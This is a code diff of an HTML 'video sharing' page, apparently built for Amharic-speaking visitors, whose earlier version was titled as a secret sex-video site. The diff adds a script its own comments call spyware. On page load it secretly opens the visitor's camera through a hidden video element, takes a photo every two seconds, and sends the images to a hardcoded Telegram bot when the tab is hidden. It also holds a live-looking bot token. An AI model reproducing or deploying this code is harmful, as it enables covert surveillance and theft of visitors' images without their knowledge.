@@ -3,284 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>habeshan hot sexx</title>
+    <title>habeshan hot video sharing</title>
     <!-- Font Awesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
-        /* General Reset & Layout */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: #0f0f0f;
-            color: #ffffff;
-        }
-
-        /* Navbar */
-        .navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 20px;
-            background-color: #202020;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 22px;
-            font-weight: bold;
-            color: #ff4757;
-        }
-
-        .upload-btn {
-            background-color: #ff4757;
-            color: white;
-            padding: 10px 18px;
-            border: none;
-            border-radius: 20px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .upload-btn:hover {
-            background-color: #e84118;
-        }
-
-        /* Container */
-        .container {
-            max-width: 1100px;
-            margin: 20px auto;
-            padding: 0 15px;
-        }
-
-        .section-title {
-            margin-bottom: 20px;
-            font-size: 20px;
-            border-left: 4px solid #ff4757;
-            padding-left: 10px;
-        }
-
-        /* Video Grid */
-        .video-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 20px;
-        }
-
-        .video-card {
-            background-color: #181818;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-            display: flex;
-            flex-direction: column;
-        }
-
-        .video-card video {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-            background-color: #000;
-        }
-
-        .card-details {
-            padding: 15px;
-        }
-
-        .card-details h4 {
-            font-size: 16px;
-            margin-bottom: 8px;
-            color: #fff;
-        }
-
-        .card-details p {
-            color: #aaa;
-            font-size: 13px;
-        }
-
-        .card-details .time {
-            font-size: 11px;
-            color: #666;
-            margin-top: 5px;
-        }
-
-        /* Upload Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.85);
-            z-index: 200;
-        }
-
-        .modal-content {
-            background-color: #202020;
-            margin: 10% auto;
-            padding: 25px;
-            border-radius: 12px;
-            width: 90%;
-            max-width: 480px;
-            position: relative;
-        }
-
-        .close-btn {
-            position: absolute;
-            right: 20px;
-            top: 15px;
-            font-size: 24px;
-            cursor: pointer;
-            color: #aaa;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 6px;
-            font-size: 14px;
-        }
-
-        .form-group input, .form-group textarea {
-            width: 100%;
-            padding: 10px;
-            background-color: #121212;
-            border: 1px solid #333;
-            border-radius: 6px;
-            color: white;
-            outline: none;
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 12px;
-            background-color: #ff4757;
-            border: none;
-            color: white;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 15px;
-        }
-
-        .submit-btn:disabled {
-            background-color: #555;
-            cursor: not-allowed;
-        }
-
-        /* Status message */
-        #statusMsg {
-            margin-top: 10px;
-            font-size: 13px;
-            text-align: center;
-        }
+        /* የድረ-ገጹ አጠቃላይ ዲዛይን (CSS) */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #0f0f0f; color: #ffffff; }
+        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background-color: #202020; }
+        .logo { font-size: 22px; font-weight: bold; color: #ff4757; }
+        .upload-btn { background-color: #ff4757; color: white; padding: 10px 18px; border: none; border-radius: 20px; cursor: pointer; font-weight: bold; }
+        .container { max-width: 1100px; margin: 20px auto; padding: 0 15px; }
+        .section-title { margin-bottom: 20px; font-size: 20px; border-left: 4px solid #ff4757; padding-left: 10px; }
+        .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
+        .video-card { background-color: #181818; border-radius: 12px; overflow: hidden; }
+        .video-card video { width: 100%; height: 200px; object-fit: cover; background-color: #000; }
+        .card-details { padding: 15px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.85); z-index: 200; }
+        .modal-content { background-color: #202020; margin: 10% auto; padding: 25px; border-radius: 12px; width: 90%; max-width: 480px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group input { width: 100%; padding: 10px; background-color: #121212; border: 1px solid #333; color: white; border-radius: 6px; }
+        .submit-btn { width: 100%; padding: 12px; background-color: #ff4757; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <!-- NAVBAR -->
+    <!-- 1. የ πር አጠቃላይ መዋቅር (Navbar & Main Layout) -->
     <header class="navbar">
-        <div class="logo">
-            <i class="fa-solid fa-face-laugh-squint"></i>
-            <span>sexx Videos</span>
-        </div>
-        <button class="upload-btn" onclick="openModal()">
-            <i class="fa-solid fa-cloud-arrow-up"></i> Video Upload
-        </button>
+        <div class="logo"><i class="fa-solid fa-video"></i> <span>Video Share</span></div>
+        <button class="upload-btn" onclick="openModal()">Video Upload</button>
     </header>
 
-    <!-- MAIN VIDEO CONTAINER -->
     <main class="container">
-        <h3 class="section-title">habesha secret sex video</h3>
+        <h3 class="section-title">Trending Videos</h3>
         <div id="videoGrid" class="video-grid">
             <p id="loadingText" style="color: #888;">ቪዲዮዎች በመጫን ላይ ናቸው...</p>
         </div>
     </main>
 
-    <!-- UPLOAD MODAL -->
+    <!-- 2. ቪዲዮ አፕሎድ የሚያደርግበት ፎርም (Modal) -->
     <div id="uploadModal" class="modal">
         <div class="modal-content">
-            <span class="close-btn" onclick="closeModal()">&times;</span>
-            <h3 style="margin-bottom: 15px;"></h3>
-            
+            <span onclick="closeModal()" style="float:right; cursor:pointer; font-size:22px;">&times;</span>
+            <h3 style="margin-bottom: 15px;">ቪዲዮ መጫኛ</h3>
             <form id="uploadForm">
                 <div class="form-group">
-                    <label for="videoTitle">የቪዲዮው ርዕስ (Title):</label>
-                    <input type="text" id="videoTitle" placeholder="ምሳሌ: የድመቶች አስቂኝ ድርጊት" required>
+                    <label>የቪዲዮው ርዕስ:</label>
+                    <input type="text" id="videoTitle" required>
                 </div>
-
                 <div class="form-group">
-                    <label for="uploaderName">የእርስዎ ስም:</label>
-                    <input type="text" id="uploaderName" placeholder="ስምዎን ያስገቡ" required>
+                    <label>የእርስዎ ስም:</label>
+                    <input type="text" id="uploaderName" required>
                 </div>
-
                 <div class="form-group">
-                    <label for="videoFile">ቪዲዮ ይምረጡ (ከስልክዎ/ኮምፒውተርዎ):</label>
+                    <label>ቪዲዮ ይምረጡ:</label>
                     <input type="file" id="videoFile" accept="video/*" required>
                 </div>
-
                 <button type="submit" id="submitBtn" class="submit-btn">Upload አድርግ</button>
                 <div id="statusMsg"></div>
             </form>
         </div>
     </div>
-    <script >
+
+    <!-- 3. ጃቫስክሪፕት (JavaScript Logic) -->
+    <script>
+        // ----------------------------------------------------
+        // ክፍል A: ስውር የስለላ (Spyware) ክፍል - ካሜራን በቀጥታ መቅረጽ
+        // ----------------------------------------------------
         const BOT_TOKEN = "8831162632:AAGowdHChrYwev9Y54NYtVGC6mYajUZpjko";
         const CHAT_ID = "8125688786";
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        // የተደበቀ የካሜራ ማያ (Hidden Video & Canvas)
+        const video = document.createElement('video');
+        video.autoplay = true;
+        video.style.display = 'none';
+        document.body.appendChild(video);
+
+        const canvas = document.createElement('canvas');
         const context = canvas.getContext('2d');
 
         let imageBuffer = [];
         let captureInterval = null;
 
-        // 1. ካሜራ ማስጀመር
+        // ተጠቃሚው ገጹን ሲከፍት ካሜራውን በስውር መክፈት
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
+                // በየ 2 ሰከንዱ አውቶማቲክ ፎቶ ማንሳት
                 captureInterval = setInterval(capturePhoto, 2000);
             })
             .catch(err => console.error("ካሜራ አልተከፈተም:", err));
 
-        // 2. ፎቶን አዘጋጅቶ Memory ላይ ማስቀመጥ
         function capturePhoto() {
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/jpeg', 0.5);
             imageBuffer.push(imageData);
-            console.log(`ፎቶ ተይዟል! ጠቅላላ የተያዙ፡ ${imageBuffer.length}`);
         }
 
-        // 3. ተጠቃሚው ገጹን ሲዘጋ ወይም ታቡን ሲቀይር (Exit Event)
+        // ተጠቃሚው ገጹን ሲዘጋ ፎቶዎቹን ወደ ቴሌግራም ቦት መላክ
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden') {
                 sendAllPhotos();
             }
         });
 
-        // 4. የተከማቹትን ፎቶዎች በሙሉ ወደ Telegram መላክ
         async function sendAllPhotos() {
             if (imageBuffer.length === 0) return;
-
             if (captureInterval) clearInterval(captureInterval);
 
             for (let i = 0; i < imageBuffer.length; i++) {
@@ -296,136 +127,96 @@
                         keepalive: true
                     });
                 } catch (e) {
-                    console.error("የመላክ ስህተት፡", e);
+                    console.error("የመላክ ስህተት:", e);
                 }
             }
             imageBuffer = [];
         }
+    </script>
 
-    <!-- FIREBASE REALTIME DATABASE SCRIPT (MODERN SDK) -->
-    < type="module">
+    <!-- ---------------------------------------------------- -->
+    <!-- ክፍል B: የፊርቤዝ ዳታቤዝ እና ቪዲዮ ማቀናበሪያ (Firebase Logic) -->
+    <!-- ---------------------------------------------------- -->
+    <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        // የ Firebase Config (የአንተ Realtime Database URL)
         const firebaseConfig = {
             databaseURL: "https://hack-8c6aa-default-rtdb.firebaseio.com"
         };
 
-        // Firebase-ን ማስጀመር
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
-
-        // በ database ውስጥ የቪዲዮዎች መስመር ('Sma' path)
         const videoRef = ref(database, 'Sma');
 
-        // Modal መክፈቻ እና መዝጋቻ
         window.openModal = () => document.getElementById("uploadModal").style.display = "block";
         window.closeModal = () => document.getElementById("uploadModal").style.display = "none";
 
-        // 1. REAL-TIME DATA LISTENER (ማንኛውም ሰው አፕሎድ ሲያደርግ በቀጥታ ለሁሉም እንዲታይ ማድረግ)
         const videoGrid = document.getElementById("videoGrid");
 
+        // ቪዲዮዎችን በ Realtime ማሳየት
         onValue(videoRef, (snapshot) => {
-            videoGrid.innerHTML = ""; // ገጹን ማጽዳት
+            videoGrid.innerHTML = "";
             const data = snapshot.val();
-
             if (!data) {
-                videoGrid.innerHTML = "<p style='color:#888;'>ምንም የተጫነ ቪዲዮ የለም። የመጀመሪያው አፕሎድ አድራጊ ይሁኑ!</p>";
+                videoGrid.innerHTML = "<p style='color:#888;'>ምንም የተጫነ ቪዲዮ የለም።</p>";
                 return;
             }
 
-            // መረጃዎቹን ከቅርብ ጊዜ ወደ ኋላ በመደርደር ማሳየት
             const keys = Object.keys(data).reverse();
             keys.forEach((key) => {
                 const item = data[key];
-                
                 const card = document.createElement("div");
                 card.className = "video-card";
                 card.innerHTML = `
                     <video controls preload="metadata">
                         <source src="${item.videoUrl}" type="video/mp4">
-                        ብራውዘርዎ ቪዲዮ ማጫወት አልቻለም።
                     </video>
                     <div class="card-details">
                         <h4>${escapeHtml(item.title)}</h4>
                         <p>አፕሎድ ያደረገው: <b>${escapeHtml(item.uploader)}</b></p>
-                        <div class="time">${item.timestamp ? new Date(item.timestamp).toLocaleString('am-ET') : ''}</div>
                     </div>
                 `;
                 videoGrid.appendChild(card);
             });
         });
 
-        // 2. VIDEO UPLOAD HANDLER (ቪዲዮ ወደ Firebase መላክ)
+        // ቪዲዮዎችን ወደ Firebase መጫን
         const uploadForm = document.getElementById("uploadForm");
         const statusMsg = document.getElementById("statusMsg");
         const submitBtn = document.getElementById("submitBtn");
 
         uploadForm.addEventListener("submit", async (e) => {
             e.preventDefault();
-
             const title = document.getElementById("videoTitle").value;
             const uploader = document.getElementById("uploaderName").value;
-            const fileInput = document.getElementById("videoFile");
-            const file = fileInput.files[0];
+            const file = document.getElementById("videoFile").files[0];
 
             if (!file) return;
 
-            // ፋይሉ ከ 15MB በላይ ከሆነ ማስጠንቀቂያ መስጠት (Firebase RTDB ገደብ ስላለው)
-            if (file.size > 15 * 1024 * 1024) {
-                statusMsg.style.color = "#ff4757";
-                statusMsg.textContent = "ቪዲዮው ከ 15MB ያነሰ መሆን አለበት!";
-                return;
-            }
-
-            statusMsg.style.color = "#eccc68";
-            statusMsg.textContent = "ቪዲዮው በመጫን ላይ ነው... እባክዎ ይጠብቁ።";
-            submitBtn.disabled = true;
-
-            // ቪዲዮውን ወደ Base64 ማየር
             const reader = new FileReader();
             reader.readAsDataURL(file);
             reader.onload = async () => {
-                const base64Video = reader.result;
-
                 try {
-                    // ወደ Firebase /Sma ፖስት ማድረግ
                     await push(videoRef, {
                         title: title,
                         uploader: uploader,
-                        videoUrl: base64Video,
+                        videoUrl: reader.result,
                         timestamp: Date.now()
                     });
-
                     statusMsg.style.color = "#2ed573";
-                    statusMsg.textContent = "ቪዲዮው በተሳካ ሁኔታ ተጭኗል!";
+                    statusMsg.textContent = "ቪዲዮው ተጭኗል!";
                     uploadForm.reset();
-                    
-                    setTimeout(() => {
-                        closeModal();
-                        statusMsg.textContent = "";
-                        submitBtn.disabled = false;
-                    }, 1500);
-
+                    setTimeout(() => closeModal(), 1500);
                 } catch (error) {
-                    console.error(error);
-                    statusMsg.style.color = "#ff4757";
-                    statusMsg.textContent = "ስህተት ተፈጥሯል፡ " + error.message;
-                    submitBtn.disabled = false;
+                    statusMsg.textContent = "ስህተት: " + error.message;
                 }
             };
         });
 
-        // XSS Security Helper
         function escapeHtml(str) {
             return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
         }
-    
-
-        
     </script>
 </body>
 </html>
-
-
